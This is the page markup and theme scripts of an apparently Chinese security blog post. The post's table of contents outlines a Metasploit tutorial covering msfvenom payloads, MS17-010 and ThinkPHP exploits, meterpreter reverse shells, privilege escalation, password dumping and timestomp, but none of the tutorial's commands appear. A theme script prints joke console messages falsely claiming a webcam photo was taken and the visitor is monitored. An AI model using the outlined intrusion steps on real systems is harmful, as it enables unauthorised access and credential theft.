toc-level-2"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-number">7.6.</span> <span class="toc-text">SMB服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-number">7.7.</span> <span class="toc-text">MSSQL服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP%E6%89%AB%E6%8F%8F"><span class="toc-number">7.8.</span> <span class="toc-text">FTP扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMTP%E6%89%AB%E6%8F%8F"><span class="toc-number">7.9.</span> <span class="toc-text">SMTP扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNMP%E6%89%AB%E6%8F%8F"><span class="toc-number">7.10.</span> <span class="toc-text">SNMP扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMAP"><span class="toc-number">7.11.</span> <span class="toc-text">WMAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">7.12.</span> <span class="toc-text">MSF端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%A8%A1%E5%9D%97-payloads"><span class="toc-number">8.</span> <span class="toc-text">MSF攻击载荷模块 - payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.1.</span> <span class="toc-text">Payload类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#singles"><span class="toc-number">8.1.1.</span> <span class="toc-text">singles</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#adduser-%E5%AE%9E%E4%BE%8B-singles"><span class="toc-number">8.1.1.1.</span> <span class="toc-text">adduser 实例 (singles)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stagers"><span class="toc-number">8.1.2.</span> <span class="toc-text">stagers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stages"><span class="toc-number">8.1.3.</span> <span class="toc-text">stages</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stageless-payload-Staged-payload"><span class="toc-number">8.1.4.</span> <span class="toc-text">Stageless payload &amp; Staged payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E7%94%9F%E6%88%90"><span class="toc-number">8.2.</span> <span class="toc-text">Payload生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom%E7%AE%80%E4%BB%8B"><span class="toc-number">8.2.1.</span> <span class="toc-text">msfvenom简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom%E9%80%89%E9%A1%B9"><span class="toc-number">8.2.2.</span> <span class="toc-text">msfvenom选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom%E7%94%9F%E6%88%90payload"><span class="toc-number">8.2.3.</span> <span class="toc-text">msfvenom生成payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msfvenom%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B"><span class="toc-number">8.2.4.</span> <span class="toc-text">msfvenom使用实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97-exploits"><span class="toc-number">9.</span> <span class="toc-text">MSF漏洞利用模块 - exploits</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-MS17-010"><span class="toc-number">9.1.</span> <span class="toc-text">Windows - MS17-010</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Thinkphp-RCE"><span class="toc-number">9.2.</span> <span class="toc-text">Linux - Thinkphp-RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Meterpreter%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97"><span class="toc-number">10.</span> <span class="toc-text">Meterpreter扩展模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E7%AE%80%E4%BB%8B"><span class="toc-number">10.1.</span> <span class="toc-text">meterpreter简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter-%E7%89%B9%E7%82%B9"><span class="toc-number">10.2.</span> <span class="toc-text">meterpreter 特点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5meterpreter"><span class="toc-number">10.2.1.</span> <span class="toc-text">进入meterpreter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E5%B8%B8%E7%94%A8shell"><span class="toc-number">10.3.</span> <span class="toc-text">meterpreter常用shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse-tcp"><span class="toc-number">10.3.1.</span> <span class="toc-text">reverse_tcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind-tcp"><span class="toc-number">10.3.2.</span> <span class="toc-text">bind_tcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse-http"><span class="toc-number">10.3.3.</span> <span class="toc-text">reverse_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse-https"><span class="toc-number">10.3.4.</span> <span class="toc-text">reverse_https</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3"><span class="toc-number">10.4.</span> <span class="toc-text">meterpreter命令详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4-1"><span class="toc-number">10.4.1.</span> <span class="toc-text">核心命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.2.</span> <span class="toc-text">文件系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.3.</span> <span class="toc-text">网络命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.4.</span> <span class="toc-text">系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.5.</span> <span class="toc-text">用户界面命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%91%84%E5%83%8F%E5%A4%B4%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.6.</span> <span class="toc-text">摄像头命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E8%BE%93%E5%87%BA%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.7.</span> <span class="toc-text">音频输出命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.8.</span> <span class="toc-text">提权命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E8%BD%AC%E5%82%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">10.4.9.</span> <span class="toc-text">密码转储命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Timestomp"><span class="toc-number">10.4.10.</span> <span class="toc-text">Timestomp</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/ae44.html" title="VPS环境搭建"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VPS环境搭建"/></a><div class="content"><a class="title" href="/posts/ae44.html" title="VPS环境搭建">VPS环境搭建</a><time datetime="2023-11-09T15:29:43.000Z" title="发表于 2023-11-09 23:29:43">2023-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3f6d.html" title="NewStarCTF2023复盘WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202310221008068.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF2023复盘WP"/></a><div class="content"><a class="title" href="/posts/3f6d.html" title="NewStarCTF2023复盘WP">NewStarCTF2023复盘WP</a><time datetime="2023-11-08T16:47:44.000Z" title="发表于 2023-11-09 00:47:44">2023-11-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/62c9.html" title="NewStarCTF2023WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202310221008068.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NewStarCTF2023WP"/></a><div class="content"><a class="title" href="/posts/62c9.html" title="NewStarCTF2023WP">NewStarCTF2023WP</a><time datetime="2023-11-08T14:23:29.000Z" title="发表于 2023-11-08 22:23:29">2023-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/20b4.html" title="HTTP请求走私漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP请求走私漏洞"/></a><div class="content"><a class="title" href="/posts/20b4.html" title="HTTP请求走私漏洞">HTTP请求走私漏洞</a><time datetime="2023-11-07T00:00:24.000Z" title="发表于 2023-11-07 08:00:24">2023-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3b65.html" title="Burp联动Proxifier抓取小程序流量"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burp联动Proxifier抓取小程序流量"/></a><div class="content"><a class="title" href="/posts/3b65.html" title="Burp联动Proxifier抓取小程序流量">Burp联动Proxifier抓取小程序流量</a><time datetime="2023-10-29T07:02:10.000Z" title="发表于 2023-10-29 15:02:10">2023-10-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">26</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2023 By 安知鱼 V1.6.9",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://hihopkc.space/',
+      region: '',
+      onCommentLoaded: () => {
+        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(runFn,0)
+    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://hihopkc.space/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
